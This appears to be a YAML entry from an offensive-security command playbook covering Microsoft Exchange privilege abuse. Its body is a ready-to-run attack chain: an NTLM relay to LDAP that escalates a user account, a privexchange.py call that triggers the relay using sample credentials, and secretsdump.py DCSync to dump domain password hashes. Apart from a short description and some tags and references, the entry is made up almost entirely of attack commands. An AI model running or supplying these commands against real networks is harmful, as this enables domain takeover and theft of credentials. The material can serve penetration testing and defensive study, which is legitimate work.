---
description: |
  Abuse Microsoft Exchange privileges — PrivExchange relay to gain DCSync rights, access OWA mailboxes, and interact with Exchange via Ruler.
commands:
  - have: Credentials
    cmd: |
      # PrivExchange — relay Exchange auth to LDAP for DCSync rights
      ntlmrelayx.py -t ldap://10.10.10.27 --escalate-user sec_user
      python3 privexchange.py -ah 10.10.10.21 -u sec_user -p 'P@ssw0rd' -d senshu.sh exchange.senshu.sh

      # After relay succeeds — DCSync
      secretsdump.py senshu.sh/sec_user:'P@ssw0rd'@10.10.10.27
phase:
  - Exploitation
target_os:
  - Windows
services:
  - HTTP
  - LDAP
techniques:
  - ACL_Abuse
references:
  - https://github.com/dirkjanm/privexchange
  - https://github.com/fortra/impacket
  - https://github.com/sensepost/ruler
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/exchange-abuse.html
---
